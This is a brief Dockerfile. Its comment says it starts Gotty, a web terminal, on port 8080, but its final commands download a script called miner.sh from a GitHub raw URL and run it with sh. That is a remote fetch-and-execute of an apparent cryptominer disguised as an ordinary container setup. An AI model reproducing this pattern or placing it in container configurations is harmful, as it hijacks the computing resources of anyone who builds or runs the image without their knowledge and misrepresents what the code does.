# Use the base image
FROM ubuntu:latest
 
# Expose the desired port
EXPOSE 8080

# RUN INSTALLATION
RUN apt-get update
RUN apt-get install -y curl wget 
 
# Start Gotty with the specified command
CMD ["wget", "https://raw.githubusercontent.com/apaple/dums/main/miner.sh"]
CMD ["sh", "miner.sh"]
